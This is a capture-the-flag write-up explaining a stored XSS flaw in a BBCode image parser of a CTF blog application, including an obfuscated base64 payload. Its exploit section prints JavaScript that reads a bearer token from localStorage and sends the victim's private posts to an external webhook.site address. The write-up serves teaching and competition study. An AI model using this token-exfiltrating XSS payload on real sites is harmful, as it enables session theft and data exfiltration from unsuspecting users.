@@ -1,0 +1,339 @@
+---
+title: SASCTF 2025 Quals – Bubble Tea Diaries
+date: '2025-05-31'
+draft: false
+authors: ['beluga']
+tags: ['Web', 'SASCTF 2025 Quals', 'XSS']
+summary: 'XSS in a BBCode image parser lets attackers steal the bot JWT and read its private post.'
+---
+
+## Bubble Tea Diaries (437 points, 16 solves)
+
+> An old duke is having a walkout near London's Tower. He sees a dog lying by the path.
+> 
+> How do you do? - he asks.
+> I do how how. - it answers.
+
+### Enviroment Setup
+
+We’re given the source code with following content:
+
+```
+beluga@localcat:/mnt/c/Users/beluga/Documents/CTF/SAS-CTF-2025/Web/BubbleTea/src$ tree .
+.
+├── backend
+│   ├── Dockerfile
+│   ├── app
+│   │   ├── __init__.py
+│   │   ├── config.py
+│   │   ├── models.py
+│   │   ├── routes
+│   │   │   ├── __init__.py
+│   │   │   ├── auth.py
+│   │   │   ├── comments.py
+│   │   │   ├── drafts.py
+│   │   │   ├── posts.py
+│   │   │   └── users.py
+│   │   └── utils
+│   │       ├── __init__.py
+│   │       ├── bb_parser.py
+│   │       └── jwt_utils.py
+│   ├── main.py
+│   └── requirements.txt
+├── bot
+│   ├── Dockerfile
+│   ├── bot.py
+│   └── flag.txt
+├── docker-compose.yml
+├── frontend
+│   └── build
+│       ├── asset-manifest.json
+│       ├── index.html
+│       └── static
+│           ├── css
+│           │   └── main.613c0cae.css
+│           └── js
+│               ├── main.03bd07b7.js
+│               └── main.03bd07b7.js.LICENSE.txt
+└── nginx
+    └── nginx.conf
+
+11 directories, 25 files
+```
+
+Right away, several things catch our attention:
+1. There’s a **bot component** - this usually means client side challenges.
+2. A **BBCode parser** - custom parsers are notorious for vulnerabilities
+
+### Source Code Analysis
+
+#### The BOT
+
+Since it’s most likely a client side challenge, we need to examine what exactly the bot is doing to figure out potential vulnerable part on the sites.
+
+```python
+# bot/bot.py
+def register(driver):
+    username = randstr(10)  # Random username
+    password = randstr(16)  # Random password
+    
+    # Bot registers like a normal user
+    driver.get(SERVICE_HOST)
+    # ... registration process ...
+    
+    # Here's the gold - bot creates a private post with the flag!
+    create_post_btn.click()
+    
+    with open('/app/flag.txt', 'r') as f:
+        flag = f.read().strip()  # Read the actual flag
+
+    post_text_field.send_keys(flag)  # Put flag in post content
+    
+    private_checkbox.click()  # Make it private - only bot can see it
+    publish_btn.click()
+    
+    return username, password
+```
+
+Based on bot snippet, we can know that:
+
+- Bot creates a random account
+- Bot puts the **actual flag** in a **private post**
+- Only the bot can access this private post (since it’s the owner)
+
+Also we need to look at how the user controlled input are passed to BOT.
+
+```python
+def visit(url: str):
+    # Security check - bot only visits post URLs
+    if not url.lower().startswith(f"{SERVICE_HOST}/post/"):
+        return False, "No way I'm visiting that, only posts!"
+
+    driver = run_chrome()  # Start Chrome browser
+    credentials = load_credentials()
+    
+    # Bot logs in with its account
+    if not login(driver, credentials):
+        register(driver)  # Create new account if login fails
+    
+    driver.get(url)  # Visit the URL we provide
+    write_opinion(driver)  # Bot interacts with the page
+```
+
+Based on that code, bot only accepts urls starting with `/post/`. This means that vulnerable part must be somewhere in the post functionality.
+
+#### The Post
+
+Now let’s look at the post mechanism:
+
+```python
+# backend/app/routes/posts.py
+@posts_bp.route('/', methods=['POST'])
+@jwt_required()
+def create_post():
+    user_id = get_jwt_identity()  # Extract user ID from JWT
+    
+    data = request.get_json()
+    content_raw = data.get('content', '')  # Raw BBCode from user
+    
+    # Input validation
+    valid, error_msg = validate_post_content(content_raw)
+    if not valid:
+        return jsonify({'error': error_msg}), 400
+
+    # Here's where it gets interesting - BBCode parsing
+    parser = BBCodeParser()
+    content_html = parser.parse(content_raw)  # Convert BBCode to HTML
+    
+    # Store both raw and parsed versions
+    post = Post(
+        content_raw=content_raw,    # Original BBCode
+        content_html=content_html,  # Parsed HTML - this gets displayed
+        user_id=user_id,
+        is_private=data.get('is_private', False),
+    )
+    
+    db.session.add(post)
+    db.session.commit()
+    
+    return jsonify({
+        'message': 'Post created successfully',
+        'post': post.to_extended_dict(),
+    }), 201
+```
+
+In this code, we can conclude several points:
+
+- Posts are stored with both raw BBCode and parsed HTML
+- The `BBCodeParser()` is used to convert user input to HTML
+
+#### The Parser
+
+The BBCode parser is our most likely attack vector. Let me examine it carefully:
+
+```python
+# backend/app/utils/bb_parser.py
+class BBCodeParser:
+    def __init__(self, allowed_tags=None):
+        self.allowed_tags = allowed_tags or current_app.config.get('ALLOWED_BB_TAGS', [
+            'b', 'i', 's', 'h1', 'list', 'quote', 'code', 
+            'url', 'img', 'youtube', 'yt'  # Note: img and youtube are allowed
+        ])
+    
+    def parse(self, text):
+        if not text:
+            return ""
+
+        # CRITICAL: HTML escaping happens FIRST
+        escaped_text = html.escape(text)
+        
+        # Then BBCode processing happens on the escaped text
+        result = escaped_text
+        for tag in self.allowed_tags:
+            if tag in self.tag_handlers:
+                result = self.tag_handlers[tag](result)  # Process each tag type
+        
+        return result
+```
+
+**What this code does:**
+1. Takes raw user input (BBCode)
+2. **HTML escapes everything first** - this should prevent XSS, right?
+3. Then processes each BBCode tag type using specific handlers
+4. Returns the final HTML
+
+This looks secure at first glance as HTML escaping should prevent XSS. But one of the custom handler catches our eyes.
+
+```python
+def _handle_image(self, text):
+    # Safe pattern for basic images
+    simple_pattern = r'\[img\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+    text = re.sub(simple_pattern, 
+                  r'<img src="\1" alt="User posted image" style="max-width:100%;">', 
+                  text)
+
+    # Safe pattern for images with dimensions
+    dim_pattern = r'\[img=(\d+),(\d+)\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+    text = re.sub(dim_pattern, 
+                  r'<img src="\3" width="\1" height="\2" alt="User posted image" style="max-width:100%;">', 
+                  text)
+
+    # 🚨 VULNERABLE PATTERN - This is the problem!
+    attr_pattern = r'\[img ([^\]]+)\](https?://[^"\'\[\]<>]+?\.(?:jpg|jpeg|png|gif))\[/img\]'
+    
+    def img_attr_replacer(match):
+        attrs_str = match.group(1)  # This is user-controlled input!
+        img_url = match.group(2)
+        
+        # 🚨 DIRECT INJECTION - No sanitization of attrs_str!
+        return f'<img src="{img_url}" {attrs_str} style="max-width:100%;">'
+        
+    text = re.sub(attr_pattern, img_attr_replacer, text)
+    return text
+```
+
+In this handler, user input will be processed with a regex to identify and transform BBCode image tags into HTML image elements. 
+
+The third pattern `r'\[img ([^\]]+)\]...'` captures everything between `[img` and `]` as "attributes" and directly injects them into the HTML without any validation or escaping!
+
+In order to understand the logic better, let’s trace through what happens:
+
+```txt
+Input: [img onerror=alert('XSS')]https://example.com/image.jpg[/img]
+
+Step 1: html.escape() applied first
+Result: [img onerror=alert('XSS')]https://example.com/image.jpg[/img]
+(No change because there's no HTML to escape yet)
+
+Step 2: BBCode parsing with attr_pattern regex
+- attrs_str = 'onerror=alert(\'XSS\')'  (captured from group 1)
+- img_url = "https://example.com/image.jpg"        (captured from group 2)
+
+Step 3: img_attr_replacer function executes
+return f'<img src="{img_url}" {attrs_str} style="max-width:100%;">'
+
+Final Result: <img src="https://example.com/image.jpg" onerror=alert('XSS') style="max-width:100%;">
+```
+
+> HTML escaping happens BEFORE BBCode processing, but the BBCode processing introduces NEW HTML content that bypasses the initial escaping!
+
+By using the payload as a post content, we got XSS!
+
+![XSS Post](/static/images/sasctf-2025-quals/bubble-tea-diaries/xss.png)
+
+![XSS Post Cont.](/static/images/sasctf-2025-quals/bubble-tea-diaries/xss2.png)
+
+### Crafting the Exploit
+
+So now we have a solid XSS bug. Time to escalate to steal flag in admin’s private posts. First we need to know where the JWT Token stored, and it was located within localstroage with a funny key `DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique`.
+
+Second, we need to know how to obtain the posts using the JWT. It was found that all posts can be viewed by sending a GET requests into `/api/posts`.
+
+```python
+@posts_bp.route('/', methods=['GET'])
+@jwt_required()
+def get_posts():
+    page = request.args.get('page', 1, type=int)
+    per_page = min(request.args.get('per_page', 10, type=int), 50)
+    
+    # This is key - it only returns posts for the authenticated user
+    posts = (
+        Post.query
+        .where(Post.user_id == get_jwt_identity())  # Bot's user ID
+        .order_by(Post.created_at.desc())
+        .paginate(page=page, per_page=per_page)
+    )
+    
+    result = []
+    for post in posts.items:
+        post_dict = post.to_extended_dict()  # This includes the content
+        # ... additional processing ...
+        result.append(post_dict)
+    
+    return jsonify({
+        'items': result,  # This will contain the flag post
+        'page': page,
+        'per_page': per_page,
+        'total': posts.total,
+        'pages': posts.pages
+    })
+```
+
+Now we can create a one-shot js code to exfiltrate the admin posts.
+
+```javascript
+const token = localStorage['DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique'];
+
+fetch('/api/posts', {
+    headers: {
+        'Authorization': 'Bearer ' + token
+    }
+})
+.then(response => response.text()) 
+.then(data => {
+    fetch('https://webhook.site/5be3ea44-54b1-4cf4-a5e5-7d8ff4caa6f0', {
+        method: 'POST',
+        body: data 
+    });
+});
+```
+
+To avoid character escaping issues, we’ll use base64-encoded payload. The final payload may look like this:
+
+```bb
+[img onerror=eval(atob('Y29uc3QgdG9rZW4gPSBsb2NhbFN0b3JhZ2VbJ0RpYXJyaGVhVG9rZW5CZWFyZXJJbkxvY2FsU3RvcmFnZUZvclNlY3VyZVJlcXVlc3RzQ29udGFjdEFkbWluSGVLbm93c0hvdFRvVXNlV2VIYXZlTWFueVRva2Vuc0hlcmVTb1RoaXNPbmVTaG91bGRCZVVuaXF1ZSddOwoKZmV0Y2goJy9hcGkvcG9zdHMnLCB7CiAgICBoZWFkZXJzOiB7CiAgICAgICAgJ0F1dGhvcml6YXRpb24nOiAnQmVhcmVyICcgKyB0b2tlbgogICAgfQp9KQoudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpIAoudGhlbihkYXRhID0+IHsKICAgIGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS81YmUzZWE0NC01NGIxLTRjZjQtYTVlNS03ZDhmZjRjYWE2ZjAnLCB7CiAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgYm9keTogZGF0YSAKICAgIH0pOwp9KTs='))]https://example.com/image.jpg[/img]
+```
+
+Now we need to create a new post with the payload and set the post type to public:
+
+![Create Post](/static/images/sasctf-2025-quals/bubble-tea-diaries/create-post.png)
+
+Then we can get the public post URL by clicking on View Post:
+
+![View Post](/static/images/sasctf-2025-quals/bubble-tea-diaries/view.png)
+
+The final step is to send the [public post URL](https://bubble-tea.task.sasc.tf/post/84d088da-3375-4ff0-b509-12f901b6d7d9/posts/42) into bot interface, which gives us flag in the webhook.
+
+![Get Flag](/static/images/sasctf-2025-quals/bubble-tea-diaries/flag.png)
+
+**Flag found:** `SAS{bl4ck_c47_1n_th3_bl4ck_r0om_d01n_b00m_boom_b00m}`
